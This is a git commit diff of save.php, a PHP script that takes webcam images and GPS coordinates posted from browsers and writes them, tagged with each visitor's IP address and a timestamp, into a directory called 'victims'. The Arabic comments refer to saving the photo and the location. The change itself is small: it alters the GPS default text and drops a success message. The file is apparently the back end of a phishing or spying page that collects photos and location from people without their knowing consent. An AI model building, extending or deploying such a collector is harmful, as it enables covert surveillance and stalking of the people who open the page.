bf30e4595059ef612b764ddd8e48d8dda4a45b85
ALTQNY <appsyria00@gmail.com>
2025-12-07 06:02:56 -0800

    Update save.php to handle GPS data differently

--- save.php
+++ save.php
@@ -1,18 +1,12 @@
 <?php
 $ip = $_SERVER['REMOTE_ADDR'];
 $time = date("Y-m-d_H-i-s");
-
 if (!is_dir("victims")) mkdir("victims", 0777, true);
 
-// حفظ الصورة
 if ($_POST['img']) {
     $img = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $_POST['img']));
     file_put_contents("victims/{$time}_{$ip}_cam.jpg", $img);
 }
-
-// حفظ الموقع
-$gps = $_POST['gps'] ?? "غير معروف";
+$gps = $_POST['gps'] ?? "غير مسموح";
 file_put_contents("victims/{$time}_{$ip}_info.txt", "IP: $ip\nGPS: $gps\nTIME: $time");
-
-echo "تم الحفظ بنجاح ✓";
 ?>
